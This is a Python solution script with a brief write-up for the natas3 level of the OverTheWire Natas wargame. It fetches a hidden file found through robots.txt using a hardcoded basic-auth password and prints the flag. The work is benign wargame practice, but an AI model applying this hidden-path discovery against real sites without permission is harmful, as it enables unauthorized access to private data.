#! /usr/bin/python


import requests


#Functions
def cleanheaders(headers):
	for item in headers:
		value=headers.get(item,'Not Found')
		print(f'{item} : {value}')


#Basic Authentication
basic_username='natas3'
basic_password='sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'


#Website Details
host=f'http://{basic_username}.natas.labs.overthewire.org'
path='/s3cr3t/users.txt'

#Custom Headers
custom_headers=''


#Payload
payload=''
url=host+path

session=requests.Session()
response=requests.get(url,auth=(basic_username,basic_password))
content=response.text
status=response.status_code
headers=response.headers



# print(f'HOST : {host}\nuser:{basic_username}\npass:{basic_password}\n')
# cleanheaders(headers)


flag=content
print(flag)


#WRITEUP
#Visiting the url we find some text on the page saying that 'There is nothing on this page'
#Checking the source of the page we find some text saying 'No more leaks ,Not even google wiill find it this time'
#This gives me an idea to check the robots.txt page
#Checking the robots page,we find a folder link {s3cr3t}
#Visiting the folder we find a file users.txt which contains the flag